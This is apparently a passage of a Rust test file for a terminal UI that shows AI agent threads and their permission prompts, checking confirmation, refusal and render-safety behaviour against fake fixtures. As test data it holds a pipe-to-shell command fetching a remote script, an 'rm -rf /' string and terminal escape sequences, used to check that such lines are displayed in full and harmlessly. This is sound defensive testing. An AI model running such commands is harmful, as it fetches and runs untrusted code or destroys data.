//! A Flexible thread as one more live session (F3), drawn from the contract's fixtures: listed with the work, its panel
//! (transcript, questions, the turn's level and cost) in each answer state, and the answer flow: `1-9` pins the
//! question shown, Enter posts exactly what was pinned, and a question that changed meanwhile is refused.
#[path = "common/pairs.rs"]
mod pairs;
use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use ratatui::backend::TestBackend;
use ratatui::Terminal;
use serde_json::{json, Value};
use toolroll_api::*;
use toolroll_fake_engine as fake;
use toolroll_tui::app::{App, Effect, Mode, Msg, Tone};
use toolroll_tui::thread::{
    CANT_ALLOW_UNSHOWN, READ_TO_THE_END, START_READ_TO_THE_END, THREAD_QUESTION_CHANGED,
};

const NOW: i64 = 1_794_657_852;
const PERMISSION: &str = "c0ffee00c0ffee00c0ffee00c0ffee02";

fn parse<T: serde::de::DeserializeOwned>(v: Value) -> T {
    serde_json::from_value(v).expect("fixture shape")
}
fn key(c: char) -> KeyEvent {
    KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE)
}
fn enter() -> KeyEvent {
    KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE)
}
fn window() -> Value {
    fake::fixture("live-session-window-thread.json")
}
fn screen(app: &mut App, w: u16, h: u16) -> String {
    let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
    term.draw(|f| toolroll_tui::view::draw(f, app)).unwrap();
    pairs::check(app, w, h);
    term.backend().to_string()
}

/// An app that read the scenario's work and the threads list, with the thread selected and its window read.
fn thread_app(window: Value) -> App {
    let mut app = App::new(false, Some("/home/me/shop".into()));
    app.now = NOW;
    let fx = app.update(Msg::Work(Ok(parse(fake::scenario_work()))));
    assert!(fx.contains(&Effect::FetchThreads), "{fx:?}");
    app.update(Msg::Threads(Ok(parse(fake::fixture("live-threads.json")))));
    let at = app
        .items
        .iter()
        .position(|i| i.id == fake::THREAD)
        .expect("the thread is listed");
    let mut asked = vec![];
    while app.selected < at {
        asked.extend(app.key(key('j')));
    }
    assert!(
        asked.iter().any(
            |e| matches!(e, Effect::FetchThread { thread, cursor: None, .. } if thread == fake::THREAD)
        ),
        "{asked:?}"
    );
    app.update(Msg::Thread(fake::THREAD.into(), Ok(parse(window))));
    app
}

/// The window with the questions' states set, by request.
fn with_states(states: &[(&str, &str, bool)]) -> Value {
    let mut w = window();
    // Other facts, another version (as the console's digest of them would be).
    w["thread"]["version"] = json!("1111111111111111");
    for q in w["thread"]["questions"].as_array_mut().unwrap() {
        if let Some((_, state, answerable)) = states.iter().find(|(r, _, _)| q["request"] == *r) {
            q["state"] = json!(state);
            q["answerable"] = json!(answerable);
        }
    }
    w
}

#[test]
fn a_thread_is_one_more_live_session_in_the_list() {
    let mut app = thread_app(window());
    let item = app.selected_item().unwrap().clone();
    assert!(item.thread && !item.is_task);
    assert_eq!(item.word, "Question");
    // Its panel: the transcript's cards, the turn's agent, level and cost, the question waiting on you.
    insta::assert_snapshot!("thread_waiting", screen(&mut app, 120, 30));
}

#[test]
fn each_answer_state_is_said_plainly() {
    // Picked and confirming.
    let mut app = thread_app(window());
    assert_eq!(app.key(key('1')), vec![]);
    assert!(matches!(app.mode, Mode::ConfirmThread(_)));
    insta::assert_snapshot!("thread_confirm", screen(&mut app, 120, 30));
    // Sending: posted, no reply yet.
    let fx = app.key(enter());
    assert!(matches!(fx.as_slice(), [Effect::Act { .. }]), "{fx:?}");
    insta::assert_snapshot!("thread_sending", screen(&mut app, 120, 30));
    // Sent, then each other end.
    for (name, state) in [("thread_sent", "sent"), ("thread_uncertain", "uncertain")] {
        let mut app = thread_app(with_states(&[(PERMISSION, state, false)]));
        insta::assert_snapshot!(name, screen(&mut app, 120, 30));
    }
    let mut app = thread_app(with_states(&[
        (PERMISSION, "not-sent", false),
        ("c0ffee00c0ffee00c0ffee00c0ffee01", "delivered", false),
    ]));
    insta::assert_snapshot!("thread_outcomes", screen(&mut app, 120, 30));
    let mut app = thread_app(with_states(&[(PERMISSION, "withdrawn", false)]));
    assert!(screen(&mut app, 120, 30).contains("Withdrawn — the turn ended"));
}

#[test]
fn an_answer_posts_exactly_the_question_and_option_shown() {
    let mut app = thread_app(window());
    app.key(key('2'));
    let shown = screen(&mut app, 120, 30);
    assert!(shown.contains("Your answer: Deny"), "{shown}");
    let fx = app.key(enter());
    let [Effect::Act { path, fields, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(
        path,
        &format!("/agents/live/thread/{}/answer", fake::THREAD)
    );
    let digest = window()["thread"]["questions"][1]["digest"]
        .as_str()
        .unwrap()
        .to_string();
    assert_eq!(
        fields,
        &vec![
            ("request".to_string(), PERMISSION.to_string()),
            ("card".to_string(), digest),
            ("decision".to_string(), "decline".to_string()),
        ]
    );
    // A question's answer is its option's words, for its one part.
    let mut w = with_states(&[
        (PERMISSION, "sent", false),
        ("c0ffee00c0ffee00c0ffee00c0ffee01", "pending", true),
    ]);
    w["thread"]["questions"][0]["digest"] = json!("e".repeat(64));
    let mut app = thread_app(w);
    app.key(key('2'));
    screen(&mut app, 120, 30);
    let fx = app.key(enter());
    let [Effect::Act { fields, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(
        fields,
        &vec![
            (
                "request".to_string(),
                "c0ffee00c0ffee00c0ffee00c0ffee01".to_string()
            ),
            ("card".to_string(), "e".repeat(64)),
            ("question".to_string(), "1".to_string()),
            ("answer".to_string(), "On the total".to_string()),
        ]
    );
}

#[test]
fn a_question_that_changed_is_refused_and_nothing_is_sent() {
    // The card changed (another digest) while the dialog was open: it closes, saying so.
    let mut app = thread_app(window());
    app.key(key('1'));
    screen(&mut app, 120, 30);
    let mut changed = window();
    changed["thread"]["questions"][1]["digest"] = json!("0".repeat(64));
    changed["thread"]["version"] = json!("2222222222222222");
    app.update(Msg::Thread(fake::THREAD.into(), Ok(parse(changed))));
    assert_eq!(app.mode, Mode::Normal);
    assert_eq!(
        app.status,
        Some((Tone::Refused, THREAD_QUESTION_CHANGED.into()))
    );
    // Enter now opens nothing and sends nothing.
    assert!(!app
        .key(enter())
        .iter()
        .any(|e| matches!(e, Effect::Act { .. })));
    // Answered elsewhere (no longer waiting): the same.
    let mut app = thread_app(window());
    app.key(key('1'));
    screen(&mut app, 120, 30);
    app.update(Msg::Thread(
        fake::THREAD.into(),
        Ok(parse(with_states(&[(PERMISSION, "sent", false)]))),
    ));
    assert_eq!(app.mode, Mode::Normal);
    // Too small to show the question and the answer whole: Enter sends nothing and says where to answer.
    let mut app = thread_app(window());
    app.key(key('1'));
    screen(&mut app, 40, 9);
    assert_eq!(app.key(enter()), vec![]);
    assert_eq!(app.status, Some((Tone::Refused, READ_TO_THE_END.into())));
    // No option of that number is refused in words.
    let mut app = thread_app(window());
    assert_eq!(app.key(key('3')), vec![]);
    assert_eq!(
        app.status,
        Some((Tone::Refused, "There's no answer 3.".into()))
    );
}

#[test]
fn threads_refused_by_the_console_are_not_listed_and_asked_for_again_with_the_next_work() {
    let mut app = App::new(false, None);
    let fx = app.update(Msg::Work(Ok(parse(fake::scenario_work()))));
    assert!(fx.contains(&Effect::FetchThreads));
    let before = app.items.len();
    assert_eq!(
        app.update(Msg::Threads(Err(ApiError::Refused(
            "Couldn't read your threads (not-available).".into()
        )))),
        vec![]
    );
    assert!(app.threads.off);
    assert_eq!(app.items.len(), before);
    assert_eq!(app.status, None);
    // Turned on meanwhile (the browser or the CLI): the next work read asks again.
    let fx = app.update(Msg::Work(Ok(parse(fake::scenario_work()))));
    assert!(fx.contains(&Effect::FetchThreads));
}

#[test]
fn the_settings_screen_says_whether_threads_are_on_read_only_with_where_to_change_it() {
    let words = |app: &App| {
        app.prefs
            .screen(200, 0, app.threads.answered.then_some(!app.threads.off))
            .iter()
            .map(|l| l.to_string())
            .collect::<Vec<_>>()
            .join("\n")
    };
    let mut app = App::new(false, None);
    assert!(words(&app).contains("Agent threads     not known yet (beta). Change it in the browser or with `toolroll config set flexible on`"));
    app.update(Msg::Threads(Ok(parse(fake::fixture("live-threads.json")))));
    assert!(words(&app).contains("Agent threads     on (beta). Change it in the browser or with `toolroll config set flexible off`"));
    app.update(Msg::Threads(Err(ApiError::Refused(
        "Couldn't read your threads (not-available).".into(),
    ))));
    assert!(words(&app).contains("Agent threads     off (beta). Change it in the browser or with `toolroll config set flexible on`"));
}

#[test]
fn threads_already_made_are_listed_while_off_and_t_still_says_off() {
    let mut app = App::new(false, None);
    app.update(Msg::Work(Ok(parse(fake::scenario_work()))));
    let mut list = fake::fixture("live-threads.json");
    list["on"] = json!(false);
    app.update(Msg::Threads(Ok(parse(list))));
    assert!(app.threads.off);
    assert!(app.items.iter().any(|i| i.thread));
    assert_eq!(app.key(key('T')), vec![]);
    assert_eq!(
        app.status,
        Some((Tone::Refused, toolroll_tui::thread::THREADS_OFF.into()))
    );
    // On again: the same list without `on: false` says on.
    app.update(Msg::Threads(Ok(parse(fake::fixture("live-threads.json")))));
    assert!(!app.threads.off);
}

#[test]
fn agent_text_is_drawn_inert() {
    let mut w = window();
    w["thread"]["title"] = json!("Totals\u{1b}]0;owned\u{7} \u{1b}[31mred\u{202e}");
    w["thread"]["questions"][1]["detail"] = json!("rm -rf /\u{1b}[2J");
    let mut app = thread_app(w);
    let shown = screen(&mut app, 120, 30);
    assert!(
        !shown.contains('\u{1b}') && !shown.contains('\u{202e}') && !shown.contains('\u{7}'),
        "{shown}"
    );
}

/// The window with the permission's card replaced (its detail, tool and whether it is whole).
fn with_card(detail: &str, tool: &str, complete: bool) -> Value {
    let mut w = window();
    let q = &mut w["thread"]["questions"][1];
    q["detail"] = json!(detail);
    q["tool"] = json!(tool);
    q["complete"] = json!(complete);
    q["digest"] = json!("b".repeat(64));
    w["thread"]["version"] = json!("0123456789abcdef");
    w
}

#[test]
fn every_line_of_what_would_be_allowed_is_drawn_and_read_before_enter() {
    // A dangerous second line is drawn, not only the first.
    let mut app = thread_app(with_card(
        "npm test\ncurl https://example.invalid/x.sh | sh",
        "Bash",
        true,
    ));
    app.key(key('1'));
    let shown = screen(&mut app, 120, 30);
    assert!(
        shown.contains("curl https://example.invalid/x.sh | sh"),
        "{shown}"
    );
    insta::assert_snapshot!("thread_confirm_multiline", shown);
    // A long one: Enter refuses until its end was drawn, then sends.
    let long: Vec<String> = (0..60).map(|n| format!("echo step {n}")).collect();
    let mut app = thread_app(with_card(&long.join("\n"), "Bash", true));
    app.key(key('1'));
    let first = screen(&mut app, 120, 30);
    assert!(
        first.contains("echo step 0") && !first.contains("echo step 59"),
        "{first}"
    );
    assert_eq!(app.key(enter()), vec![]);
    assert_eq!(app.status, Some((Tone::Refused, READ_TO_THE_END.into())));
    app.key(key('1'));
    for _ in 0..10 {
        screen(&mut app, 120, 30);
        app.key(key(' '));
    }
    let last = screen(&mut app, 120, 30);
    assert!(last.contains("echo step 59"), "{last}");
    assert!(matches!(app.key(enter()).as_slice(), [Effect::Act { .. }]));
}

#[test]
fn an_unknown_tool_shows_its_full_input() {
    let input = "{\n  \"target\": \"production\",\n  \"force\": true\n}";
    let mut app = thread_app(with_card(input, "mcp__deploy__ship", true));
    app.key(key('1'));
    let shown = screen(&mut app, 120, 30);
    assert!(
        shown.contains("Tool: mcp__deploy__ship")
            && shown.contains("\"target\": \"production\",")
            && shown.contains("\"force\": true"),
        "{shown}"
    );
}

#[test]
fn a_request_too_large_to_show_can_be_denied_but_not_allowed() {
    let mut app = thread_app(with_card("echo 0\necho 1\n… and 400 more lines\nThis can't be allowed from here: it is too long to show here. You can deny it.", "Bash", false));
    assert!(screen(&mut app, 120, 30).contains("1 Allow — not from here: it can't all be shown"));
    assert_eq!(app.key(key('1')), vec![]);
    assert_eq!(app.status, Some((Tone::Refused, CANT_ALLOW_UNSHOWN.into())));
    assert_eq!(app.mode, Mode::Normal);
    app.key(key('2'));
    assert!(matches!(app.mode, Mode::ConfirmThread(_)));
}

#[test]
fn an_idle_thread_is_read_less_often_and_an_unchanged_poll_rebuilds_nothing() {
    let mut w = with_states(&[(PERMISSION, "sent", false)]);
    let mut app = thread_app(w.clone());
    // Nothing changes: after each unchanged (held) read the next waits longer, up to every eighth tick (2 s).
    w["thread"] = Value::Null;
    w.as_object_mut().unwrap().remove("thread");
    w["window"]["records"] = json!([]);
    // The held read the first window sent comes back unchanged (the console's wait ran out).
    app.update(Msg::Thread(fake::THREAD.into(), Ok(parse(w.clone()))));
    let mut gaps = vec![];
    for _ in 0..5 {
        let mut ticks = 0;
        loop {
            ticks += 1;
            let fx = app.update(Msg::Tick);
            if fx.iter().any(|e| matches!(e, Effect::FetchThread { .. })) {
                break;
            }
            assert!(ticks < 20);
        }
        gaps.push(ticks);
        let version = app.threads.view.as_ref().unwrap().transcript.version;
        app.update(Msg::Thread(fake::THREAD.into(), Ok(parse(w.clone()))));
        assert_eq!(
            app.threads.view.as_ref().unwrap().transcript.version,
            version,
            "an unchanged poll rebuilt the transcript"
        );
        assert!(
            app.threads.view.as_ref().unwrap().facts.is_some(),
            "facts left out mean unchanged, not gone"
        );
    }
    assert_eq!(gaps, vec![2, 4, 8, 8, 8]);
}

#[test]
fn a_change_wakes_the_screen_through_a_held_read_and_nothing_polls_while_it_waits() {
    // The window just read changed what is shown, so a held read (wait) already went: while the console holds it (a
    // question waiting on you, as here), no tick asks again. No 250 ms polling.
    let mut app = thread_app(window());
    for _ in 0..40 {
        assert!(
            !app.update(Msg::Tick)
                .iter()
                .any(|e| matches!(e, Effect::FetchThread { .. })),
            "a tick polled while a held read waits"
        );
    }
    // The console answers the held read with a change (the answer was received): the next held read goes at once,
    // held to the cursor and the facts' version the screen now has.
    let fx = app.update(Msg::Thread(
        fake::THREAD.into(),
        Ok(parse(with_states(&[(PERMISSION, "delivered", false)]))),
    ));
    assert!(
        fx.iter().any(|e| matches!(
            e,
            Effect::FetchThread {
                wait: true,
                cursor: Some(_),
                known: Some(_),
                ..
            }
        )),
        "{fx:?}"
    );
    for _ in 0..40 {
        assert!(!app
            .update(Msg::Tick)
            .iter()
            .any(|e| matches!(e, Effect::FetchThread { .. })));
    }
}

#[test]
fn the_first_read_of_a_thread_is_never_held() {
    let mut app = App::new(false, Some("/home/me/shop".into()));
    app.now = NOW;
    app.update(Msg::Work(Ok(parse(fake::scenario_work()))));
    app.update(Msg::Threads(Ok(parse(fake::fixture("live-threads.json")))));
    let at = app.items.iter().position(|i| i.id == fake::THREAD).unwrap();
    let mut asked = vec![];
    while app.selected < at {
        asked.extend(app.key(key('j')));
    }
    assert!(asked.iter().any(|e| matches!(
        e,
        Effect::FetchThread {
            cursor: None,
            known: None,
            wait: false,
            ..
        }
    )));
}

/// A new thread's terms card, as the console answers `T`'s first message.
fn start_app() -> (App, Vec<Effect>) {
    let mut app = App::new(false, Some("/home/me/shop".into()));
    app.now = NOW;
    app.update(Msg::Work(Ok(parse(fake::scenario_work()))));
    app.key(key('T'));
    for c in "Fix the README".chars() {
        app.key(key(c));
    }
    let fx = app.key(enter());
    (app, fx)
}

#[test]
fn a_new_threads_terms_card_is_read_whole_before_enter_starts_it_with_exactly_its_key() {
    let (mut app, fx) = start_app();
    // The first message asks for the card only: no key posted, nothing started.
    assert_eq!(
        fx,
        vec![Effect::Act {
            path: "/agents/live/thread".into(),
            fields: vec![
                ("message".into(), "Fix the README".into()),
                ("repo".into(), "/home/me/shop".into())
            ],
            done: "The thread started.".into(),
        }]
    );
    app.update(Msg::Acted(Ok(ActOutcome::ThreadTerms {
        key: fake::START_KEY.into(),
        lines: fake::start_card_lines(),
    })));
    assert!(matches!(app.mode, Mode::StartThread(_)));
    insta::assert_snapshot!("thread_start_terms", screen(&mut app, 120, 30));
    // Enter before the end was drawn starts nothing.
    assert_eq!(app.key(enter()), vec![]);
    assert_eq!(
        app.status,
        Some((Tone::Refused, START_READ_TO_THE_END.into()))
    );
    assert!(matches!(app.mode, Mode::StartThread(_)));
    // Read on to the end (drawn), then Enter posts the message, the card's key and the project: nothing else.
    for _ in 0..10 {
        app.key(key(' '));
        screen(&mut app, 120, 30);
    }
    insta::assert_snapshot!("thread_start_terms_end", screen(&mut app, 120, 30));
    assert_eq!(
        app.key(enter()),
        vec![Effect::Act {
            path: "/agents/live/thread".into(),
            fields: vec![
                ("message".into(), "Fix the README".into()),
                ("terms".into(), fake::START_KEY.into()),
                ("repo".into(), "/home/me/shop".into())
            ],
            done: "The thread started.".into(),
        }]
    );
    assert_eq!(app.mode, Mode::Normal);
}

#[test]
fn a_terms_card_too_big_for_the_window_never_counts_as_read_and_esc_starts_nothing() {
    let (mut app, _) = start_app();
    app.update(Msg::Acted(Ok(ActOutcome::ThreadTerms {
        key: fake::START_KEY.into(),
        lines: fake::start_card_lines(),
    })));
    // A window too small to show the card at all (the screen draws, the card can't): Enter still starts nothing.
    for _ in 0..30 {
        app.key(key(' '));
        assert!(screen(&mut app, 40, 10).contains("don't fit"));
    }
    assert_eq!(app.key(enter()), vec![]);
    assert_eq!(
        app.key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE)),
        vec![]
    );
    assert_eq!(app.mode, Mode::Normal);
    assert_eq!(
        app.status,
        Some((Tone::Said, "Nothing was started.".into()))
    );
}

#[test]
fn a_thread_on_the_diff_tab_keeps_its_own_keys() {
    // The Diff tab's keys (j/k move its cursor, 1-9 nothing) are a task result's; on a thread the list still moves and
    // the numbers still pick the question's answer.
    let mut app = thread_app(window());
    app.tab = toolroll_tui::app::Tab::Diff;
    app.key(key('1'));
    assert!(matches!(app.mode, Mode::ConfirmThread(_)), "{:?}", app.mode);
    app.key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
    let at = app.selected;
    app.key(key('k'));
    assert_eq!(app.selected, at - 1);
}

#[test]
fn every_word_of_a_terms_card_is_drawn_at_any_width_never_cut_at_the_edge() {
    // Tall enough to hold the whole card at once: the dialog's own columns, read back as text, hold every line of the
    // card word for word (a line wrapped across rows reads on in the next row), and Enter may start it.
    for width in [72u16, 90, 120] {
        let (mut app, _) = start_app();
        app.update(Msg::Acted(Ok(ActOutcome::ThreadTerms {
            key: fake::START_KEY.into(),
            lines: fake::start_card_lines(),
        })));
        let drawn = screen(&mut app, width, 90);
        let w = (width - 6).min(100) as usize;
        let x = (width as usize - w) / 2;
        let inside: Vec<String> = drawn
            .lines()
            .map(|row| {
                row.trim_matches('"')
                    .chars()
                    .skip(x + 1)
                    .take(w - 2)
                    .collect::<String>()
            })
            .collect();
        let text = inside
            .join(" ")
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        for line in fake::start_card_lines() {
            let words = line.split_whitespace().collect::<Vec<_>>().join(" ");
            assert!(
                text.contains(&words),
                "at {width} columns the card didn't draw {line:?} whole"
            );
        }
        assert!(matches!(&app.mode, Mode::StartThread(t) if t.seen_end));
    }
}

#[test]
fn paging_a_short_card_never_skips_a_row_and_a_jump_past_unread_rows_never_counts_as_read() {
    // 16 rows tall: six rows of the card at a time, fewer than the ten an old page moved by.
    let (mut app, _) = start_app();
    app.update(Msg::Acted(Ok(ActOutcome::ThreadTerms {
        key: fake::START_KEY.into(),
        lines: fake::start_card_lines(),
    })));
    let mut seen = String::new();
    seen.push_str(&screen(&mut app, 120, 16));
    for _ in 0..20 {
        app.key(key(' '));
        seen.push_str(&screen(&mut app, 120, 16));
    }
    // Every line, word for word, was on screen at some page.
    for line in fake::start_card_lines() {
        let words: Vec<&str> = line.split_whitespace().collect();
        assert!(
            words.iter().all(|w| seen.contains(w)),
            "paging skipped part of {line:?}"
        );
    }
    assert!(matches!(&app.mode, Mode::StartThread(t) if t.seen_end));
    // A card jumped to its end without the rows between drawn: Enter starts nothing.
    let (mut app, _) = start_app();
    app.update(Msg::Acted(Ok(ActOutcome::ThreadTerms {
        key: fake::START_KEY.into(),
        lines: fake::start_card_lines(),
    })));
    screen(&mut app, 120, 16);
    if let Mode::StartThread(terms) = &mut app.mode {
        terms.scroll = 10_000;
    }
    screen(&mut app, 120, 16);
    assert!(matches!(&app.mode, Mode::StartThread(t) if !t.seen_end));
    assert_eq!(app.key(enter()), vec![]);
    assert_eq!(
        app.status,
        Some((Tone::Refused, START_READ_TO_THE_END.into()))
    );
    // Laid out again at another width, it is read again from the top.
    let (mut app, _) = start_app();
    app.update(Msg::Acted(Ok(ActOutcome::ThreadTerms {
        key: fake::START_KEY.into(),
        lines: fake::start_card_lines(),
    })));
    for _ in 0..20 {
        app.key(key(' '));
        screen(&mut app, 90, 30);
    }
    assert!(matches!(&app.mode, Mode::StartThread(t) if t.seen_end));
    // Wider: fewer rows than were read, but not the same rows.
    screen(&mut app, 120, 16);
    assert!(matches!(&app.mode, Mode::StartThread(t) if !t.seen_end));
}

/// n works everywhere: with a thread open, the new task's composer is drawn in the thread's panel, and what is typed
/// shows there before Enter files it (it was once typed into unseen).
#[test]
fn a_new_task_typed_while_a_thread_is_open_is_shown() {
    let mut app = thread_app(window());
    for (w, h) in [(120, 30), (120, 18)] {
        app.key(key('n'));
        assert!(matches!(app.mode, Mode::NewTask(..)), "{:?}", app.mode);
        for c in "Add a test".chars() {
            app.key(key(c));
        }
        let shown = screen(&mut app, w, h);
        assert!(shown.contains("New task: Add a test"), "{shown}");
        app.key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
        assert!(matches!(app.mode, Mode::Normal), "{:?}", app.mode);
    }
}

/// An act answered while a thread is open (another thread started) is said about no task: nothing then asks for "the
/// task's steps" by the thread's id, which the engine refuses ("Couldn't read the task's steps").
#[test]
fn an_answer_while_a_thread_is_open_follows_no_task() {
    let mut app = thread_app(window());
    let fx = app.update(Msg::Acted(Ok(ActOutcome::Done(
        "The thread started.".into(),
    ))));
    let ticks: Vec<Effect> = (0..3).flat_map(|_| app.update(Msg::Tick)).collect();
    for e in fx.iter().chain(ticks.iter()) {
        assert!(
            !matches!(e, Effect::FetchSteps(id) if id == fake::THREAD),
            "{fx:?} {ticks:?}"
        );
    }
    assert_eq!(
        app.status.as_ref().map(|(_, w)| w.as_str()),
        Some("The thread started.")
    );
}

#[test]
fn a_stopped_turn_says_so_in_plain_words_with_toolrolls_own_note() {
    let mut w = window();
    w["thread"]["version"] = json!("2222222222222222");
    w["thread"]["questions"] = json!([]);
    w["thread"]["turn"]["status"] = json!("interrupted");
    w["thread"]["turn"]["endWords"] = json!("Your Claude sign-in for threads was removed, so Toolroll stopped this turn. Add one again, then reply to continue.");
    let mut app = thread_app(w);
    let shown = screen(&mut app, 120, 30);
    assert!(shown.contains("turn 2 stopped"), "{shown}");
    assert!(screen(&mut app, 160, 30).contains("turn 2 stopped · on your plan"));
    assert!(!shown.contains("total unknown"), "{shown}");
    assert!(
        shown.contains("Toolroll: Your Claude sign-in for threads was removed, so Toolroll"),
        "{shown}"
    );
}

/// The threads list with the selected thread's turn in `turn` (and its agent live or not).
fn threads_with(turn: &str, live: bool) -> Value {
    let mut list = fake::fixture("live-threads.json");
    list["threads"][0]["turn"] = json!(turn);
    list["threads"][0]["live"] = json!(live);
    list
}

#[test]
fn s_on_a_thread_is_reply_and_enter_posts_the_message_under_its_own_key() {
    let mut app = thread_app(window());
    // While its turn is still working, s says so, and its box opens all the same (what is typed goes there, never to
    // the workbench's keys: tests/stranger11.rs); Esc closes it.
    assert_eq!(app.key(key('s')), vec![]);
    assert!(matches!(&app.mode, Mode::ThreadReply(t, _) if t == fake::THREAD));
    assert!(
        app.status
            .as_ref()
            .is_some_and(|(_, w)| w.contains("still working")),
        "{:?}",
        app.status
    );
    app.key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
    assert!(matches!(app.mode, Mode::Normal));
    app.update(Msg::Threads(Ok(parse(threads_with("finished", false)))));
    assert_eq!(app.key(key('s')), vec![]);
    assert!(
        matches!(&app.mode, Mode::ThreadReply(t, _) if t == fake::THREAD),
        "{:?}",
        app.mode
    );
    let shown = screen(&mut app, 120, 30);
    assert!(shown.contains("Reply:"), "{shown}");
    assert!(
        shown.contains("A fresh agent picks this up with the conversation so far."),
        "{shown}"
    );
    for c in "Now add a test".chars() {
        app.key(key(c));
    }
    let fx = app.key(enter());
    let [Effect::Act { path, fields, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(path, &format!("/agents/live/thread/{}/turn", fake::THREAD));
    assert_eq!(
        fields[0],
        ("message".to_string(), "Now add a test".to_string())
    );
    assert_eq!(fields[1].0, "key");
    assert_eq!(fields[1].1.len(), 32);
    assert!(fields[1].1.bytes().all(|b| b.is_ascii_hexdigit()));
    // Each reply has a key of its own.
    app.key(key('s'));
    for c in "again".chars() {
        app.key(key(c));
    }
    let again = app.key(enter());
    let [Effect::Act { fields: second, .. }] = again.as_slice() else {
        panic!("{again:?}")
    };
    assert_ne!(second[1].1, fields[1].1);
}

#[test]
fn an_ended_thread_takes_no_reply() {
    let mut app = thread_app(window());
    let mut list = threads_with("interrupted", false);
    list["threads"][0]["ended"] = json!(true);
    app.update(Msg::Threads(Ok(parse(list))));
    // Still selected (an ended thread moves to Recent): s says it ended. Its box opens so what is typed goes there
    // (never to the workbench's keys), and Enter sends nothing from it.
    app.selected = app.items.iter().position(|i| i.id == fake::THREAD).unwrap();
    assert_eq!(app.key(key('s')), vec![]);
    assert!(matches!(&app.mode, Mode::ThreadReply(t, _) if t == fake::THREAD));
    for c in "new".chars() {
        app.key(key(c));
    }
    assert_eq!(app.key(enter()), vec![]);
    assert!(matches!(&app.mode, Mode::ThreadReply(_, text) if text == "new"));
    assert!(
        app.status
            .as_ref()
            .is_some_and(|(_, w)| w.contains("This thread has ended")),
        "{:?}",
        app.status
    );
}

#[test]
fn x_and_capital_x_on_a_thread_ask_first_then_post_stop_or_end_for_that_thread() {
    for (k, verb, asked) in [
        ('x', "stop", "Stop the agent's turn?"),
        ('X', "end", "End this thread?"),
    ] {
        let mut app = thread_app(window());
        assert_eq!(app.key(key(k)), vec![]);
        assert!(
            matches!(&app.mode, Mode::ConfirmThreadAct(t, _) if t == fake::THREAD),
            "{:?}",
            app.mode
        );
        let shown = screen(&mut app, 120, 30);
        assert!(shown.contains(asked), "{shown}");
        // Any other key cancels; nothing is posted.
        assert_eq!(app.key(key('n')), vec![]);
        assert!(matches!(app.mode, Mode::Normal));
        app.key(key(k));
        let fx = app.key(key('y'));
        let [Effect::Act { path, fields, .. }] = fx.as_slice() else {
            panic!("{fx:?}")
        };
        assert_eq!(
            path,
            &format!("/agents/live/thread/{}/{verb}", fake::THREAD)
        );
        assert!(fields.is_empty());
    }
}

fn ship_terms(laptop: bool) -> ActOutcome {
    ActOutcome::ShipTerms {
        key: "3".repeat(32),
        digest: "4".repeat(32),
        lines: vec![
            "  Task      Changes from a Flexible thread".into(),
            "  Ships     1 changed file from this thread, as commit 0123456789ab".into(),
            "  Merges    Toolroll merges it by itself once the project's checks pass on this exact commit.".into(),
        ],
        laptop,
        command: (!laptop).then(|| format!("toolroll thread ship {} --key {}", fake::THREAD, "3".repeat(32))),
    }
}

#[test]
fn a_on_a_thread_reads_the_ship_terms_whole_then_enter_ships_on_the_laptop_road_only() {
    let mut app = thread_app(window());
    app.update(Msg::Threads(Ok(parse(threads_with("finished", false)))));
    let fx = app.key(key('a'));
    let [Effect::Act { path, fields, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(path, &format!("/agents/live/thread/{}/ship", fake::THREAD));
    assert!(fields.is_empty(), "asking for the terms ships nothing");
    // The laptop road: the sheet, read to the end, then Enter presses exactly its key and digest.
    app.update(Msg::Acted(Ok(ship_terms(true))));
    let shown = screen(&mut app, 120, 40);
    assert!(shown.contains("Ship approves exactly this:"), "{shown}");
    assert!(
        shown.contains("Enter") && shown.contains("Ship it"),
        "{shown}"
    );
    let fx = app.key(enter());
    let [Effect::Act { path, fields, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(path, &format!("/agents/live/thread/{}/ship", fake::THREAD));
    assert_eq!(
        fields,
        &vec![
            ("terms".to_string(), "3".repeat(32)),
            ("digest".to_string(), "4".repeat(32))
        ]
    );
    // Off it: Enter hands the yes to the command line (a password typed there), and posts nothing.
    app.update(Msg::Acted(Ok(ship_terms(false))));
    screen(&mut app, 120, 40);
    let fx = app.key(enter());
    assert_eq!(
        fx,
        vec![Effect::Scrollback(vec![format!(
            "toolroll thread ship {} --key {}",
            fake::THREAD,
            "3".repeat(32)
        )])]
    );
    assert!(
        app.status
            .as_ref()
            .is_some_and(|(_, w)| w.contains("password typed now")),
        "{:?}",
        app.status
    );
}

#[test]
fn while_a_thread_ships_x_stops_the_ship_and_r_sends_it_back_with_a_note() {
    let mut app = thread_app(window());
    let mut list = threads_with("finished", false);
    list["threads"][0]["ship"] = json!("armed");
    app.update(Msg::Threads(Ok(parse(list))));
    assert_eq!(
        app.selected_item().map(|i| i.word.as_str()),
        Some("Question")
    );
    app.key(key('x'));
    assert!(screen(&mut app, 120, 30).contains("Stop this Ship for good?"));
    let fx = app.key(key('y'));
    let [Effect::Act { path, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(
        path,
        &format!("/agents/live/thread/{}/ship/cancel", fake::THREAD)
    );
    app.key(key('r'));
    for c in "Keep the old name".chars() {
        app.key(key(c));
    }
    assert!(screen(&mut app, 120, 30).contains("Send back:"));
    let fx = app.key(enter());
    let [Effect::Act { path, fields, .. }] = fx.as_slice() else {
        panic!("{fx:?}")
    };
    assert_eq!(
        path,
        &format!("/agents/live/thread/{}/ship/send-back", fake::THREAD)
    );
    assert_eq!(
        fields[0],
        ("feedback".to_string(), "Keep the old name".to_string())
    );
    assert_eq!(fields[1].1.len(), 32);
}

/// A threads list row with these facts (the fixture's second thread, made to order).
fn row(turn: Option<&str>, ship: Option<&str>, waiting: i64, ended: bool) -> ThreadRow {
